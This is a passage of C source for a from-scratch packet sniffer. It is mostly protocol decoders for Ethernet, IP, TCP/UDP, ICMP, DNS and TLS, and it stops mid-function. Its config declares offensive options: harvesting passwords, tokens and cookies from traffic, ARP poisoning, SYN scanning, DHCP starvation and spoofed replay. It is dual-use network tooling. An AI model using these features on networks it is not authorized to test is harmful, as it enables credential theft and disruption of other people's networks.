/*
 * ch1m3ra - a packet sniffer built from scratch
 *
 * Raw AF_PACKET socket, every byte parsed by hand. No libpcap, no scapy.
 * Decodes: Ethernet/802.1Q, ARP, IPv4, IPv6 (+ext hdrs), TCP, UDP,
 * ICMP, ICMPv6 - including checksums, TCP options and payload dumps.
 * App layer: DNS (also mDNS/LLMNR), TLS (ClientHello SNI/ALPN, alerts),
 * HTTP/1.x (request/status lines, Host).
 *
 * build:   make
 * run:     sudo ./ch1m3ra -i wlan0        (live capture, needs root)
 *          ./ch1m3ra -r capture.pcap      (offline, no root needed)
 *
 * Only capture traffic on networks you own or are authorized to test.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <getopt.h>
#include <errno.h>
#include <signal.h>
#include <strings.h>
#include <time.h>
#include <ifaddrs.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <poll.h>
#include <termios.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define VERSION "2.0"

/* ---------- config ---------- */
static struct {
    const char *iface;    /* -i */
    const char *rfile;    /* -r read pcap */
    const char *wfile;    /* -w write pcap */
    const char *host;     /* -H filter host substring */
    const char *proto;    /* -P filter protocol */
    long   port;          /* -p filter port, -1 = off */
    long   count;         /* -n stop after n packets, 0 = unlimited */
    long   snaplen;       /* -s bytes per packet */
    long   dumpbytes;     /* -B payload bytes to dump, 0 = off */
    int    quiet;         /* -q summary line only, no payload dump */
    int    color;         /* -C force colors off */
    int    nopromisc;     /* -P is taken... use -M no promiscuous */
    long   follow;        /* -T follow stream id: -1 off, 0 = all streams */
    const char *outfmt;   /* -o text|json|csv */
    int    reltime;       /* -e relative timestamps */
    const char *bfilter;  /* -F kernel BPF filter expression */
    int    ring;          /* -Z zero-copy PACKET_RX_RING capture */
    int    tui;           /* -U interactive TUI */

    /* --- offensive / analysis features --- */
    int    harvest;       /* -K harvest credentials/tokens/banners */
    int    finger;        /* -O passive OS fingerprinting */
    int    talkers;       /* -Y top-talkers / connection matrix */
    int    names;         /* -N mDNS/LLMNR/NBNS name harvest */
    const char *credfile; /* -k <file> append harvested creds to a file */
    int    evasion;       /* -E thorough filtering: parse instead of fixed offsets */

    /* active tools (all require root + explicit flag) */
    const char *arp_poison;  /* --arp-poison A,B[,iface] */
    const char *syn_scan;    /* --syn-scan host[:ports] */
    const char *dhcp_starve; /* --dhcp-starve iface[:count] */
    const char *replay;      /* --replay <pcap> re-send captured frames */
    const char *rewrite_src; /* --rewrite-src A.B.C.D for replay */
    long   syn_ports_a, syn_ports_b; /* parsed port range holder */
    int    active;           /* set once any active tool is requested */
} cfg = { .iface=NULL, .rfile=NULL, .wfile=NULL, .host=NULL, .proto=NULL,
          .port=-1, .count=0, .snaplen=65535, .dumpbytes=96,
          .quiet=0, .color=-1, .nopromisc=0, .follow=-1,
          .outfmt="text", .reltime=0, .bfilter=NULL, .ring=0, .tui=0,
          .harvest=0, .finger=0, .talkers=0, .names=0, .credfile=NULL,
          .evasion=0, .arp_poison=NULL, .syn_scan=NULL, .dhcp_starve=NULL,
          .replay=NULL, .rewrite_src=NULL,
          .syn_ports_a=0, .syn_ports_b=0, .active=0 };

static volatile sig_atomic_t g_stop = 0;
static void on_sigint(int s) { (void)s; g_stop = 1; }

/* ---------- tiny helpers ---------- */
#define CDIM (cfg.color ? "\x1b[90m" : "")
#define CRED (cfg.color ? "\x1b[91m" : "")
#define CGRN (cfg.color ? "\x1b[92m" : "")
#define CYEL (cfg.color ? "\x1b[93m" : "")
#define CBLU (cfg.color ? "\x1b[94m" : "")
#define CMAG (cfg.color ? "\x1b[95m" : "")
#define CCYN (cfg.color ? "\x1b[96m" : "")
#define C0   (cfg.color ? "\x1b[0m"  : "")
#define CWHT (cfg.color ? "\x1b[1;37m" : "")

static uint16_t rd16(const uint8_t *p) { return (uint16_t)((p[0] << 8) | p[1]); }
static uint32_t rd32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3];
}

static uint32_t ck_add(uint32_t sum, const uint8_t *d, size_t n) {
    while (n > 1) { sum += ((uint32_t)d[0] << 8) | d[1]; d += 2; n -= 2; }
    if (n) sum += (uint32_t)d[0] << 8;
    return sum;
}
static uint16_t ck_fold(uint32_t sum) {
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)~sum;
}
/* 1 = valid (segment includes its own stored checksum), 0 = bad */
static int ck_ok_incl(const uint8_t *d, size_t n) { return ck_fold(ck_add(0, d, n)) == 0; }

static void lstv(char *dst, size_t sz, const char *sep, const char *fmt, va_list ap) {
    size_t used = strlen(dst);
    size_t sl = strlen(sep);
    if (used + sl + 1 >= sz) return;
    if (used) { memcpy(dst + used, sep, sl + 1); used += sl; }
    vsnprintf(dst + used, sz - used, fmt, ap);
}
/* append "val" to a comma-separated list buffer */
static void lst(char *dst, size_t sz, const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    lstv(dst, sz, ", ", fmt, ap);
    va_end(ap);
}
/* append with a space separator (app-layer summaries) */
static void lsts(char *dst, size_t sz, const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    lstv(dst, sz, " ", fmt, ap);
    va_end(ap);
}

static void mac_str(const uint8_t *m, char *out, size_t sz) {
    snprintf(out, sz, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

/* ---------- name tables ---------- */
static const char *ipproto_name(uint8_t p) {
    switch (p) {
        case 1: return "icmp";   case 2: return "igmp";   case 6: return "tcp";
        case 17: return "udp";   case 41: return "ipv6";  case 47: return "gre";
        case 50: return "esp";   case 51: return "ah";    case 58: return "icmpv6";
        case 89: return "ospf";  case 103: return "pim";  case 132: return "sctp";
        default: return NULL;
    }
}
static const char *icmp4_name(uint8_t t) {
    switch (t) {
        case 0: return "echo-reply";      case 3: return "dest-unreach";
        case 4: return "src-quench";      case 5: return "redirect";
        case 8: return "echo-request";    case 9: return "router-advert";
        case 10: return "router-solicit"; case 11: return "time-exceeded";
        case 12: return "param-problem";  case 13: return "timestamp";
        case 14: return "timestamp-reply";default: return "unknown";
    }
}
static const char *icmp6_name(uint8_t t) {
    switch (t) {
        case 1: return "dest-unreach";   case 2: return "pkt-too-big";
        case 3: return "time-exceeded";  case 4: return "param-problem";
        case 128: return "echo-request"; case 129: return "echo-reply";
        case 133: return "router-solicit"; case 134: return "router-advert";
        case 135: return "neigh-solicit";case 136: return "neigh-advert";
        case 137: return "redirect";     default: return "unknown";
    }
}
static const char *ethertype_name(uint16_t e) {
    switch (e) {
        case 0x0800: return "IPv4";  case 0x0806: return "ARP";
        case 0x8035: return "RARP";  case 0x8100: return "802.1Q";
        case 0x86dd: return "IPv6";  case 0x888e: return "EAPOL";
        case 0x88cc: return "LLDP";  case 0x8847: return "MPLS";
        case 0x88b6: return "802.1X"; default: return NULL;
    }
}
static const char *port_service(uint16_t port, int istcp) {
    struct servent *s = getservbyport(htons(port), istcp ? "tcp" : "udp");
    return s ? s->s_name : NULL;
}

/* ---------- decoded packet ---------- */
enum { APP_NONE = 0, APP_DNS, APP_TLS, APP_HTTP };

typedef struct {
    struct timespec ts;
    char   ifname[IF_NAMESIZE];
    int    have_dir, outgoing;
    size_t caplen, wirelen;

    int    has_l2;
    uint8_t eth_src[6], eth_dst[6];
    uint16_t etype;
    int    vlan;

    int    has_arp, arp_ok;
    uint16_t arp_htype, arp_ptype, arp_op;
    uint8_t arp_sha[6], arp_tha[6];
    char   arp_spa[INET_ADDRSTRLEN], arp_tpa[INET_ADDRSTRLEN];

    int    ip_ver;              /* 0, 4, 6 */
    uint8_t src[16], dst[16];
    char   src_s[INET6_ADDRSTRLEN], dst_s[INET6_ADDRSTRLEN];
    uint8_t ttl;                /* ttl or hop limit */
    uint16_t ip_id;
    int    df, mf, frag_off;
    int    ip_csum;             /* -1 n/a, 0 bad, 1 ok */

    int    has_tcp, has_udp, has_icmp;
    int    icmp_ver;
    uint16_t sport, dport;
    uint32_t seq, ack;
    uint16_t win;
    uint16_t flags;
    char   flags_s[48], opts_s[256];
    char   ext_s[96];           /* IPv6 extension-header chain */
    int    l4_csum;             /* -2 none, -1 unknown, 0 bad, 1 ok */
    uint16_t udp_len;
    uint8_t icmp_type, icmp_code;
    uint16_t icmp_id, icmp_seq;

    char   l4name[16];          /* lower-case L4 name or "" */
    char   disp[16];            /* upper-case display name */
    char   primary[16];         /* stats/filter bucket */
    int    stream_id;           /* TCP stream id, -1 = none */

    const uint8_t *payload;
    size_t plen, avail;

    /* application layer */
    int    app;                /* APP_* */
    char   app_s[384];         /* one-line summary */
    /* DNS */
    char   dns_name[192];      /* primary question name */
    char   dns_first[448];     /* first answer summary */
    uint16_t dns_qtype;
    int    dns_qr, dns_opcode, dns_rcode, dns_qd, dns_an;
    /* TLS */
    char   tls_type[24];       /* client-hello, alert, app-data, ... */
    uint8_t tls_ct;            /* record content type */
    char   tls_ver[16];        /* negotiated/record version */
    char   tls_vers[96];       /* offered versions (ClientHello) */
    char   tls_sni[192];
    char   tls_alpn[128];
    uint16_t tls_cipher;
    /* HTTP */
    char   http_line[256];     /* request line or status line */
    char   http_host[192];
    int    http_code;

    /* --- credential / token harvesting (-K) --- */
    int    cred_kind;          /* CRED_* enum, 0 = none */
    char   cred_user[128];     /* username / login */
    char   cred_pass[160];     /* password / secret (may be a token) */
    char   cred_where[64];     /* "HTTP Basic", "FTP", "TLS(SNI)", ... */
    char   token[1448];        /* raw JWT or bearer token (decoded header shown) */
    char   cookie[256];        /* Set-Cookie / Cookie value (truncated) */
    char   jwt_sub[128];       /* decoded JWT payload summary */
    /* --- protocol banners / service ids --- */
    char   banner[128];        /* service banner (SSH/SMTP/FTP/POP3/IMAP/MySQL) */
    char   svc[24];            /* guessed service name for the port */

    /* --- passive OS fingerprint (-O): filled by finger_observe --- */
    char   os_guess[64];       /* e.g. "Linux 5.x", "Windows 10/11" */

    const char *err;
    int malformed;
} packet_t;

/* credential kinds for harvest */
enum { CRED_NONE = 0, CRED_BASIC, CRED_BEARER, CRED_FTP, CRED_POP3, CRED_IMAP,
       CRED_SMTP, CRED_TELNET, CRED_FORM, CRED_SNMP, CRED_COOKIE };

/* ---------- stats ---------- */
static struct {
    unsigned long long cap, shown, filtered, bad, bytes;
    unsigned long long b[8];    /* tcp udp icmp icmpv6 arp ip ipv6 other */
    unsigned long long a[3];    /* dns tls http */
    unsigned long long creds;   /* credentials/tokens harvested */
    unsigned long long banners; /* service banners seen */
    unsigned long long names;   /* names learned via mDNS/LLMNR/NBNS */
} st;

static int bucket(const packet_t *p) {
    if (!strcmp(p->primary, "tcp"))    return 0;
    if (!strcmp(p->primary, "udp"))    return 1;
    if (!strcmp(p->primary, "icmp"))   return 2;
    if (!strcmp(p->primary, "icmpv6")) return 3;
    if (!strcmp(p->primary, "arp"))    return 4;
    if (!strcmp(p->primary, "ip"))     return 5;
    if (!strcmp(p->primary, "ipv6"))   return 6;
    return 7;
}
static const char *bucket_name(int i) {
    static const char *n[8] = {"tcp","udp","icmp","icmpv6","arp","ip","ipv6","other"};
    return n[i];
}

/* TUI hooks (defined in the TUI section; inert unless -U is given) */
static int  tui_active;
static void tui_packet_line(const packet_t *p);
static int  tui_run(void);

/* ---------- decoding ---------- */
static void tcp_flags_str(uint16_t f, char *out, size_t sz) {
    out[0] = 0;
    if (f & 0x0100) lst(out, sz, "NS");
    if (f & 0x0001) lst(out, sz, "FIN");
    if (f & 0x0002) lst(out, sz, "SYN");
    if (f & 0x0004) lst(out, sz, "RST");
    if (f & 0x0008) lst(out, sz, "PSH");
    if (f & 0x0010) lst(out, sz, "ACK");
    if (f & 0x0020) lst(out, sz, "URG");
    if (f & 0x0040) lst(out, sz, "ECE");
    if (f & 0x0080) lst(out, sz, "CWR");
    if (!out[0]) snprintf(out, sz, "none");
}

static void tcp_opts_str(const uint8_t *o, size_t n, char *out, size_t sz) {
    out[0] = 0;
    size_t i = 0;
    while (i < n) {
        uint8_t k = o[i];
        if (k == 0) { lst(out, sz, "EOL"); break; }
        if (k == 1) { lst(out, sz, "NOP"); i++; continue; }
        if (i + 1 >= n) { lst(out, sz, "truncated"); break; }
        uint8_t l = o[i + 1];
        if (l < 2 || i + l > n) { lst(out, sz, "bad-len"); break; }
        switch (k) {
            case 2:
                if (l == 4) lst(out, sz, "MSS=%u", rd16(o + i + 2));
                else lst(out, sz, "MSS?");
                break;
            case 3:  if (l == 3) lst(out, sz, "WS=%u", o[i + 2]); break;
            case 4:  lst(out, sz, "SACK-perm"); break;
            case 5:  lst(out, sz, "SACK"); break;
            case 8:  if (l == 10) lst(out, sz, "TS=%u/%u", rd32(o + i + 2), rd32(o + i + 6));
                     break;
            case 28: lst(out, sz, "UTO"); break;
            case 30: lst(out, sz, "MPTCP"); break;
            case 34: lst(out, sz, "FastOpen"); break;
            default: lst(out, sz, "k=%u", k);
        }
        i += l;
    }
    if (!out[0]) snprintf(out, sz, "none");
}

/* pseudo-header checksum for tcp/udp/icmpv6 */
static uint16_t l4_cksum(const packet_t *p, const uint8_t *seg, size_t n, int is_v6, uint8_t proto) {
    uint32_t s = 0;
    if (is_v6) {
        s = ck_add(s, p->src, 16);
        s = ck_add(s, p->dst, 16);
        s += (uint32_t)(n >> 16);
        s += (uint32_t)(n & 0xffff);
        s += proto;
    } else {
        s = ck_add(s, p->src, 4);
        s = ck_add(s, p->dst, 4);
        s += proto;
        s += (uint32_t)n;
    }
    s = ck_add(s, seg, n);
    return ck_fold(s);
}

static void decode_tcp(packet_t *p, const uint8_t *b, size_t avail, size_t total, int is_v6);
static void decode_udp(packet_t *p, const uint8_t *b, size_t avail, size_t total, int is_v6);
static void decode_icmp(packet_t *p, const uint8_t *b, size_t avail, size_t total, int ver);
static void decode_app(packet_t *p);
static void decode_banner(packet_t *p, const uint8_t *b, size_t n);

static void decode_l4(packet_t *p, const uint8_t *seg, size_t avail, size_t total, uint8_t nh, int is_v6) {
    p->l4name[0] = 0;
    switch (nh) {
        case 6:  decode_tcp(p, seg, avail, total, is_v6); break;
        case 17: decode_udp(p, seg, avail, total, is_v6); break;
        case 1:  case 58: decode_icmp(p, seg, avail, total, is_v6 ? 6 : 4); break;
        default: {
            const char *nm = ipproto_name(nh);
            snprintf(p->l4name, sizeof p->l4name, "%s", nm ? nm : "unknown");
            snprintf(p->disp, sizeof p->disp, "%s", nm ? nm : "UNKNOWN");
            snprintf(p->primary, sizeof p->primary, "%s", is_v6 ? "ipv6" : "ip");
            p->payload = seg;
            p->plen = total ? total : avail;
            p->avail = avail;
            break;
        }
    }
}

static void decode_tcp(packet_t *p, const uint8_t *b, size_t avail, size_t total, int is_v6) {
    snprintf(p->l4name, sizeof p->l4name, "tcp");
    snprintf(p->disp, sizeof p->disp, "TCP");
    snprintf(p->primary, sizeof p->primary, "tcp");
    p->has_tcp = 1;
    p->l4_csum = -1;
    if (avail < 20) {
        p->err = "truncated TCP header"; p->malformed = 1;
        p->payload = b; p->plen = avail; p->avail = avail;
        return;
    }
    p->sport = rd16(b); p->dport = rd16(b + 2);
    p->seq = rd32(b + 4); p->ack = rd32(b + 8);
    size_t doff = (size_t)(b[12] >> 4) * 4;
    p->flags = (uint16_t)((b[12] & 1) << 8) | b[13];
    p->win = rd16(b + 14);
    tcp_flags_str(p->flags, p->flags_s, sizeof p->flags_s);
    if (doff < 20 || doff > avail) {
        p->err = "bad TCP data offset"; p->malformed = 1;
        snprintf(p->opts_s, sizeof p->opts_s, "none");
        p->payload = b + 20; p->plen = avail - 20; p->avail = avail - 20;
        return;
    }
    if (doff > 20) tcp_opts_str(b + 20, doff - 20, p->opts_s, sizeof p->opts_s);
    else snprintf(p->opts_s, sizeof p->opts_s, "none");

    size_t logical = total ? total : avail;
    p->payload = b + doff;
    p->plen = logical > doff ? logical - doff : 0;
    p->avail = avail > doff ? avail - doff : 0;

    if (total >= 20 && total <= avail) p->l4_csum = (l4_cksum(p, b, total, is_v6, 6) == 0) ? 1 : 0;
    else p->l4_csum = -1;   /* capture cut short, can't verify */
    decode_app(p);
}

static void decode_udp(packet_t *p, const uint8_t *b, size_t avail, size_t total, int is_v6) {
    snprintf(p->l4name, sizeof p->l4name, "udp");
    snprintf(p->disp, sizeof p->disp, "UDP");
    snprintf(p->primary, sizeof p->primary, "udp");
    p->has_udp = 1;
    p->l4_csum = -1;
    if (avail < 8) {
        p->err = "truncated UDP header"; p->malformed = 1;
        p->payload = b; p->plen = avail; p->avail = avail;
        return;
    }
    p->sport = rd16(b); p->dport = rd16(b + 2);
    p->udp_len = rd16(b + 4);
    uint16_t stored = rd16(b + 6);

    p->payload = b + 8;
    p->plen = p->udp_len >= 8 ? p->udp_len - 8 : 0;
    p->avail = avail > 8 ? avail - 8 : 0;
    if (p->udp_len < 8) { p->err = "bad UDP length"; p->malformed = 1; return; }

    if (stored == 0) p->l4_csum = is_v6 ? 0 : -2;      /* v6: 0 is illegal */
    else if (p->udp_len > avail || (total && p->udp_len > total)) p->l4_csum = -1;
    else p->l4_csum = (l4_cksum(p, b, p->udp_len, is_v6, 17) == 0) ? 1 : 0;
    (void)total;
    decode_app(p);
}

static void decode_icmp(packet_t *p, const uint8_t *b, size_t avail, size_t total, int ver) {
    snprintf(p->l4name, sizeof p->l4name, "icmp%s", ver == 6 ? "v6" : "");
    snprintf(p->disp, sizeof p->disp, "ICMP%s", ver == 6 ? "v6" : "");
    snprintf(p->primary, sizeof p->primary, "icmp%s", ver == 6 ? "v6" : "");
    p->has_icmp = 1; p->icmp_ver = ver;
    p->l4_csum = -1;
    if (avail < 8) {
        p->err = "truncated ICMP header"; p->malformed = 1;
        p->payload = b; p->plen = avail; p->avail = avail;
        return;
    }
    p->icmp_type = b[0]; p->icmp_code = b[1];
    p->payload = b + 8;
    p->plen = total > 8 ? total - 8 : (avail > 8 ? avail - 8 : 0);
    p->avail = avail > 8 ? avail - 8 : 0;

    int is_echo = (ver == 4 && (p->icmp_type == 0 || p->icmp_type == 8)) ||
                  (ver == 6 && (p->icmp_type == 128 || p->icmp_type == 129));
    if (is_echo) { p->icmp_id = rd16(b + 4); p->icmp_seq = rd16(b + 6); }

    size_t logical = total ? total : avail;
    if (logical < 8 || logical > avail) { p->l4_csum = -1; return; }
    if (ver == 4) p->l4_csum = ck_ok_incl(b, logical) ? 1 : 0;
    else          p->l4_csum = (l4_cksum(p, b, logical, 1, 58) == 0) ? 1 : 0;
}

/* ---------- application layer (DNS / TLS / HTTP) ---------- */
static const char *dns_type_name(uint16_t t) {
    switch (t) {
        case 1: return "A";     case 2: return "NS";    case 5: return "CNAME";
        case 6: return "SOA";   case 12: return "PTR";  case 15: return "MX";
        case 16: return "TXT";  case 28: return "AAAA"; case 33: return "SRV";
        case 41: return "OPT";  case 47: return "RRSIG";case 48: return "DNSKEY";
        case 52: return "TLSA"; case 64: return "SVCB"; case 65: return "HTTPS";
        case 255: return "ANY"; default: return NULL;
    }
}
static const char *dns_rcode_name(int r) {
    switch (r) {
        case 0: return "NOERROR";  case 1: return "FORMERR"; case 2: return "SERVFAIL";
        case 3: return "NXDOMAIN"; case 4: return "NOTIMP";  case 5: return "REFUSED";
        case 6: return "YXDOMAIN"; case 7: return "YXRRSET"; case 8: return "NXRRSET";
        case 9: return "NOTAUTH";  case 10: return "NOTZONE"; default: return NULL;
    }
}
static const char *dns_opcode_name(int o) {
    switch (o) {
        case 0: return "QUERY"; case 1: return "IQUERY"; case 2: return "STATUS";
        case 4: return "NOTIFY"; case 5: return "UPDATE"; case 6: return "DSO";
        default: return NULL;
    }
}

/* Parse a DNS name with compression pointers. msg/total describe the whole
 * DNS message, off is the name's position. Returns the number of bytes the
 * name occupies in the original stream (position after it). */
static size_t dns_name(const uint8_t *msg, size_t total, size_t off,
                       char *out, size_t sz) {
    size_t o = off, consumed = 0, w = 0;
    int jumps = 0;
    out[0] = 0;
    while (o < total) {
        uint8_t l = msg[o];
        if (l == 0) {
            o++;
            if (!jumps) consumed = o - off;
            break;
        }
        if ((l & 0xc0) == 0xc0) {           /* compression pointer */
            if (o + 1 >= total) break;
            if (!jumps) consumed = (o + 2) - off;
            size_t tgt = (((size_t)l & 0x3f) << 8) | msg[o + 1];
            if (++jumps > 16 || tgt >= total) break;
            o = tgt;
            continue;
        }
        if (l > 0x3f || o + 1 + l > total) break;
        if (w && w + 1 < sz) out[w++] = '.';
        for (size_t i = 0; i < l && w + 1 < sz; i++) {
            unsigned c = msg[o + 1 + i];
            out[w++] = (c >= 32 && c < 127) ? (char)c : '.';
        }
        o += 1 + l;
        if (!jumps) consumed = o - off;
    }
    if (!consumed) consumed = (o > off) ? o - off : 1;
    out[w < sz ? w : sz - 1] = 0;
    return consumed;
}

static void decode_dns(packet_t *p, const uint8_t *b, size_t n, int over_tcp) {
    if (over_tcp) {                       /* 2-byte length prefix */
        if (n < 2) return;
        size_t decl = rd16(b);
        b += 2; n -= 2;
        if (decl && decl < n) n = decl;
    }
    if (n < 12) return;

    uint16_t flags = rd16(b + 2);
    uint16_t qd = rd16(b + 4), an = rd16(b + 6);
    int qr = (flags >> 15) & 1;
    p->app = APP_DNS;
    p->dns_qr = qr;
    p->dns_opcode = (flags >> 11) & 0xf;
    p->dns_rcode = qr ? (flags & 0xf) : -1;
    p->dns_qd = qd;
    p->dns_an = an;

    size_t o = 12;
    char tmp[192];
    if (qd && o < n) {
        o += dns_name(b, n, o, p->dns_name, sizeof p->dns_name);
        if (o + 4 <= n) { p->dns_qtype = rd16(b + o); o += 4; }
        for (uint16_t i = 1; i < qd && i < 8 && o + 4 <= n; i++) {
            o += dns_name(b, n, o, tmp, sizeof tmp);
            o += 4;
        }
    }
    /* summarize the first answer record */
    for (uint16_t i = 0; i < an && i < 8 && o + 10 <= n && !p->dns_first[0]; i++) {
        char nm[192], ab[INET6_ADDRSTRLEN], tbuf[16];
        o += dns_name(b, n, o, nm, sizeof nm);
        if (o + 10 > n) break;
        uint16_t t = rd16(b + o);
        uint16_t rl = rd16(b + o + 8);
        o += 10;
        if (o + rl > n) break;
        const char *tn = dns_type_name(t);
        if (!tn) { snprintf(tbuf, sizeof tbuf, "TYPE%u", t); tn = tbuf; }
        switch (t) {
            case 1:
                if (rl == 4) {
                    inet_ntop(AF_INET, b + o, ab, sizeof ab);
                    snprintf(p->dns_first, sizeof p->dns_first, "%s %s %s", nm, tn, ab);
                }
                break;
            case 28:
                if (rl == 16) {
                    inet_ntop(AF_INET6, b + o, ab, sizeof ab);
                    snprintf(p->dns_first, sizeof p->dns_first, "%s %s %s", nm, tn, ab);
                }
                break;
            case 2: case 5: case 12: {
                char tgt[192];
                dns_name(b, n, o, tgt, sizeof tgt);
                snprintf(p->dns_first, sizeof p->dns_first, "%s %s %s", nm, tn, tgt);
                break;
            }
            case 15:
                if (rl >= 3) {
                    char tgt[192];
                    dns_name(b, n, o + 2, tgt, sizeof tgt);
                    snprintf(p->dns_first, sizeof p->dns_first, "%s %s pref=%u %s",
                             nm, tn, rd16(b + o), tgt);
                }
                break;
            case 16:
                if (rl >= 1) {
                    size_t l = b[o], c;
                    char txt[200];
                    if (l > (size_t)(rl - 1)) l = (size_t)(rl - 1);
                    c = l < sizeof txt - 1 ? l : sizeof txt - 1;
                    memcpy(txt, b + o + 1, c);
                    txt[c] = 0;
                    snprintf(p->dns_first, sizeof p->dns_first, "%s %s \"%s\"", nm, tn, txt);
                }
                break;
            default:
                snprintf(p->dns_first, sizeof p->dns_first, "%s %s %u bytes", nm, tn, rl);
                break;
        }
        o += rl;
    }

    char tbuf[16];
    const char *tn = dns_type_name(p->dns_qtype);
    if (!tn) { snprintf(tbuf, sizeof tbuf, "TYPE%u", p->dns_qtype); tn = tbuf; }
    const char *nm = p->dns_name[0] ? p->dns_name : "?";
    if (!qr) {
        snprintf(p->app_s, sizeof p->app_s, "query %s %s", nm, tn);
        if (p->dns_opcode) {
            const char *op = dns_opcode_name(p->dns_opcode);
            char ob[16];
            if (!op) { snprintf(ob, sizeof ob, "opcode%d", p->dns_opcode); op = ob; }
            lsts(p->app_s, sizeof p->app_s, "opcode=%s", op);
        }
    } else {
        const char *rc = dns_rcode_name(p->dns_rcode);
        char rb[16];
        if (!rc) { snprintf(rb, sizeof rb, "rcode%d", p->dns_rcode); rc = rb; }
        snprintf(p->app_s, sizeof p->app_s, "%s %s %s", rc, nm, tn);
        if (p->dns_first[0]) lsts(p->app_s, sizeof p->app_s, "-> %s", p->dns_first);
        lsts(p->app_s, sizeof p->app_s, "(%u ans)", an);
    }
    if (flags & 0x0400) lsts(p->app_s, sizeof p->app_s, "aa");
    if (flags & 0x0200) lsts(p->app_s, sizeof p->app_s, "truncated");
}

/* --- TLS --- */
static const char *tls_ct_name(uint8_t c) {
    switch (c) {
        case 20: return "change-cipher-spec";
        case 21: return "alert";
        case 22: return "handshake";
        case 23: return "app-data";
        case 24: return "heartbeat";
        default: return NULL;
    }
}
static const char *tls_hs_name(uint8_t t) {
    switch (t) {
        case 0:  return "hello-request";
        case 1:  return "client-hello";
        case 2:  return "server-hello";
        case 4:  return "new-session-ticket";
        case 8:  return "encrypted-extensions";
        case 11: return "certificate";
        case 12: return "server-key-exchange";
        case 13: return "certificate-request";
        case 14: return "server-hello-done";
        case 15: return "certificate-verify";
        case 16: return "client-key-exchange";
        case 20: return "finished";
        case 24: return "key-update";
        default: return NULL;
    }
}
static const char *tls_alert_name(uint8_t d) {
    switch (d) {
        case 0:   return "close_notify";
        case 10:  return "unexpected_message";
        case 20:  return "bad_record_mac";
        case 22:  return "record_overflow";
        case 40:  return "handshake_failure";
        case 42:  return "bad_certificate";
        case 46:  return "certificate_unknown";
        case 48:  return "unknown_ca";
        case 70:  return "protocol_version";
        case 71:  return "insufficient_security";
        case 80:  return "internal_error";
        case 86:  return "inappropriate_fallback";
        case 109: return "certificate_required";
        case 110: return "no_application_protocol";
        case 112: return "unrecognized_name";
        case 116: return "certificate_expired";
        default:  return NULL;
    }
}
static const char *tls_ver_str(uint16_t v, char *buf, size_t sz) {
    switch (v) {
        case 0x0300: return "SSL3.0";
        case 0x0301: return "TLS1.0";
        case 0x0302: return "TLS1.1";
        case 0x0303: return "TLS1.2";
        case 0x0304: return "TLS1.3";
        default: snprintf(buf, sz, "0x%04x", v); return buf;
    }
}
static const char *tls_cipher_name(uint16_t c) {
    switch (c) {
        case 0x1301: return "TLS_AES_128_GCM_SHA256";
        case 0x1302: return "TLS_AES_256_GCM_SHA384";
        case 0x1303: return "TLS_CHACHA20_POLY1305_SHA256";
        case 0x1304: return "TLS_AES_128_CCM_SHA256";
        case 0xc02b: return "ECDHE-ECDSA-AES128-GCM-SHA256";
        case 0xc02c: return "ECDHE-ECDSA-AES256-GCM-SHA384";
        case 0xc02f: return "ECDHE-RSA-AES128-GCM-SHA256";
        case 0xc030: return "ECDHE-RSA-AES256-GCM-SHA384";
        case 0xcca8: return "ECDHE-RSA-CHACHA20-POLY1305";
        case 0xcca9: return "ECDHE-ECDSA-CHACHA20-POLY1305";
        case 0xc013: return "ECDHE-RSA-AES128-SHA";
        case 0xc014: return "ECDHE-RSA-AES256-SHA";
        case 0x009c: return "RSA-AES128-GCM-SHA256";
        case 0x009d: return "RSA-AES256-GCM-SHA384";
        case 0x002f: return "RSA-AES128-SHA";
        case 0x0035: return "RSA-AES256-SHA";
        case 0x000a: return "RSA-3DES-EDE-SHA";
        case 0x0005: return "RSA-RC4-SHA";
        case 0x0004: return "RSA-RC4-MD5";
        default: return NULL;
    }
}

/* walk the extensions of a Client/ServerHello; fills SNI/ALPN/version fields */
static void tls_exts(packet_t *p, const uint8_t *b, size_t pos, size_t end, int is_sh) {
    char vb[16];
    while (pos + 4 <= end) {
        uint16_t et = rd16(b + pos), el = rd16(b + pos + 2);
        pos += 4;
        if (pos + el > end) break;
        const uint8_t *e = b + pos;
        if (et == 0 && !is_sh && el >= 5) {                 /* server_name */
            size_t q = 2;
            while (q + 3 <= el) {
                uint8_t typ = e[q];
                size_t nl = rd16(e + q + 1);
                if (q + 3 + nl > el) break;
                if (typ == 0 && nl && !p->tls_sni[0]) {
                    size_t c = nl < sizeof p->tls_sni ? nl : sizeof p->tls_sni - 1;
                    memcpy(p->tls_sni, e + q + 3, c);
                    p->tls_sni[c] = 0;
                    break;
                }
                q += 3 + nl;
            }
        } else if (et == 16 && !is_sh && el >= 2) {         /* ALPN */
            size_t q = 2, used = strlen(p->tls_alpn);
            while (q < el) {
                uint8_t pl = e[q++];
                if (q + pl > el) break;
                if (used && used + 1 < sizeof p->tls_alpn) p->tls_alpn[used++] = ',';
                size_t c = pl;
                if (used + c >= sizeof p->tls_alpn) c = sizeof p->tls_alpn - used - 1;
                memcpy(p->tls_alpn + used, e + q, c);
                used += c;
                p->tls_alpn[used] = 0;
                q += pl;
            }
        } else if (et == 43 && el >= 1) {                   /* supported_versions */
            if (is_sh && el >= 2) {
                snprintf(p->tls_ver, sizeof p->tls_ver, "%s",
                         tls_ver_str(rd16(e), vb, sizeof vb));
            } else if (!is_sh) {
                size_t q = 1, used = 0;
                size_t vlen = 1 + (size_t)e[0];      /* 1-byte length + list */
                if (vlen > el) vlen = el;
                p->tls_vers[0] = 0;
                while (q + 2 <= vlen) {
                    uint16_t v = rd16(e + q);
                    if (used) { if (used + 1 < sizeof p->tls_vers) p->tls_vers[used++] = '/'; }
                    const char *vs = tls_ver_str(v, vb, sizeof vb);
                    size_t c = strlen(vs);
                    if (used + c >= sizeof p->tls_vers) break;
